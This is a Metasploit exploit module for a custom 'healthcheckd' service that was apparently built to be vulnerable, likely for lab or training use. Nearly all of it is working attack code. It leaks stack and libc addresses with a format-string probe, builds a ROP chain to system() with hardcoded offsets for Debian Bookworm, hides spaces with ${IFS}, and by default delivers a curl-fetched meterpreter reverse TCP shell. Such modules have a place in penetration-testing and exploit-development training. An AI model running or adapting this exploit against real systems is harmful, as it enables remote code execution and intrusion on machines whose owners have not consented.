class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking 

  include Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Healthcheckd Exploit',
        'Description' => %q{
          This exploit module exploits a remote code execution vulnability
          in a custum healthcheckd application.
        },
        'License' => MSF_LICENSE,
        'Author' => ['whotwagner'],
        'References' => [
          [ 'URL', 'https://github.com/whotwagner/healthcheckd'],
        ],
        'CmdStagerFlavor' => [ 'bourne', 'curl', 'wget', 'printf', 'echo' ],
        'DefaultOptions' => {
          'PAYLOAD' => 'cmd/linux/http/x64/meterpreter_reverse_tcp',
          'FETCH_WRITABLE_DIR' => '/tmp',
          'FETCH_COMMAND' => 'CURL'
        },
        'Targets' => [
          [
            'Linux Debian Bookworm (libc 2.36-9+deb12u3)',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'libc_index' => 3,
              'code_index' => 4,
              'stack_index' => 52,
              'system_offset' => 4006,
              'exit_offset' => 3878,
              'cmd_offset' => 1560,
              'poprdi_offset' => 1749787,
              'ret_offset' => 498168
            }
          ]
        ],
        'DisclosureDate' => '2023-10-26',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(1881),
        OptBool.new('DEBUGGER', [false, 'Wait some time in order to attach debugger.', false])
      ]
    )
  end

  # The check is not needed
  # healthcheckd is a custom tool
  # that is supposed to be vulnerable
  def check
    CheckCode::Vulnerable
  end

  def fmtstr
    '%p-' * 55 + "\n"
  end

  def parse_locations(out_str)
    locations = out_str.split('-')
    if datastore['DEBUGGER']
      i = 0
      locations.each do |x|
        print_good("#{i}: #{x}")
        i += 1
      end
    end
    @base_one = locations[target['code_index']].to_i(16)
    @base2 = locations[target['libc_index']].to_i(16)
    @base3 = locations[target['stack_index']].to_i(16)
  end

  def prepare_ropchain(cmd)
    poprdi = [@base_one - target['poprdi_offset']].pack('Q')
    print_good("poprdi: 0x#{(@base_one - target['poprdi_offset']).to_s(16)}")
    ret = [@base_one - target['ret_offset']].pack('Q')
    print_good("ret: 0x#{(@base_one - target['ret_offset']).to_s(16)}")
    system = [@base2 - target['system_offset']].pack('Q')
    print_good("system: 0x#{(@base2 - target['system_offset']).to_s(16)}")
    exitpop = [@base2 - target['exit_offset']].pack('Q')
    print_good("exit: 0x#{(@base2 - target['exit_offset']).to_s(16)}")
    binsh = [@base3 - target['cmd_offset']].pack('Q')
    print_good("binsh: 0x#{(@base3 - target['cmd_offset']).to_s(16)}")
    dlog("payload: #{cmd}")
    command = cmd.gsub(' ', '${IFS}')
    command += "\x00"
    # command = "touch${IFS}/tmp/test\x00"
    ropchain = 'A' * 312 + poprdi + binsh + ret + system + exitpop + command

    return ropchain
  end

  def check_badchars(ropchain)
    badchars = ["\x09", "'\x0a", "\x0b", "\x0c", "\x0d", "\x20" ]
    ropchain.unpack('C*').each do |x|
      badchars.each do |b|
        if x.chr == b
          print_warning("found bad char: #{b.ord}")
          return false
        end
      end
    end
    return true
  end

  def execute_command(cmd, _opts = {})
    connect
    sock.get_once
    sock.put(fmtstr)
    out = sock.get_once
    parse_locations(out)
    ropchain = prepare_ropchain(cmd)
    if !check_badchars(ropchain)
      sock.close
      sleep(3)
      execute_command(cmd, _opts)
    else
      if datastore['DEBUGGER']
        puts(ropchain.inspect)
        puts('ATTACH DEBUGGER!')
        sleep(10)
      end
      sock.put(ropchain + "\n")
    end
  end

  def exploit
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    end
    handler
  end
end
